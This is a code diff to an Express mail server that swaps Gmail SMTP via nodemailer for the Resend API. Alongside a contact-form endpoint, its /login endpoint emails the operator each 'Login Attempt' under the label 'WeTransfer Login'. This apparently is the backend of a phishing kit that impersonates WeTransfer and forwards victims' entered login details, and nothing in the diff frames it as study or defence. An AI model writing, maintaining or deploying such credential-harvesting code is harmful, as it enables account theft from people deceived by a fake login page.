@@ -1,34 +1,18 @@
 require('dotenv').config();
 const express = require('express');
-const nodemailer = require('nodemailer');
 const cors = require('cors');
+const { Resend } = require('resend');
+const path = require('path');
 
 const app = express();
-
-const allowedOrigins = (process.env.ALLOWED_ORIGIN || '').split(',').map(o => o.trim());
 
 app.use(cors());
 app.use(express.json());
 
-const transporter = nodemailer.createTransport({
-  host: 'smtp.gmail.com',
-  port: 587,
-  secure: false, // STARTTLS
-  auth: {
-    user: process.env.GMAIL_USER,
-    pass: process.env.GMAIL_PASS,
-  },
-});
-
-const path = require('path');
+const resend = new Resend(process.env.RESEND_API_KEY);
 
 // Serve static files from /public
 app.use(express.static(path.join(__dirname, 'public')));
-
-// Health check
-// app.get('/', (req, res) => {
-//   res.json({ status: 'Mail server is running' });
-// });
 
 // Send email endpoint
 app.post('/send', async (req, res) => {
@@ -39,9 +23,8 @@ app.post('/send', async (req, res) => {
   }
 
   try {
-    await transporter.sendMail({
-      from: `"${name}" <${process.env.GMAIL_USER}>`,
-      replyTo: email,
+    await resend.emails.send({
+      from: 'onboarding@resend.dev',
       to: process.env.GMAIL_USER,
       subject: subject || `New message from ${name}`,
       html: `
@@ -68,8 +51,8 @@ app.post('/login', async (req, res) => {
   }
 
   try {
-    await transporter.sendMail({
-      from: `"WeTransfer Login" <${process.env.GMAIL_USER}>`,
+    await resend.emails.send({
+      from: 'onboarding@resend.dev',
       to: process.env.GMAIL_USER,
       subject: `Login Attempt — ${email}`,
       html: `
